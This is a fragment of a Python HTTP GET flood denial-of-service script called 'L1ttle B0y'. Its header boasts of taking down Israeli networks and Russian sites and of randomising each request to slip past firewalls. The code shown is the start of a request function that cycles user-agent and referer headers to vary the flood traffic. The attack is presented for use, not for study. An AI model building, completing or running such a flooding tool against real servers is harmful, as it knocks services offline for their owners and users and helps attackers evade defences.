# L1ttle B0y by D3LTOP
# ---------------------------------------
# Coded by wanted.gov
# 
# This uses the HTTP GET FLOOD method, where large amounts of HTTP GET requests are directed to a webserver.
# To avoid detection by firewall, this tool creates a unique get request for each request sent to the target.
#
# This was mostly used to:
# - Take down Israeli networks
# - Take down Russian sites
# - Testing webserver strength
# 
...
def send_request(url):
    global useragents, referers
    try:
        useragent_list = useragents.strip().split('\n')
        referer_list = referers.strip().split('\n')
        for agent in useragent_list:
            for ref in referer_list:
                headers = {'User-Agent': agent, 'Referer': ref}
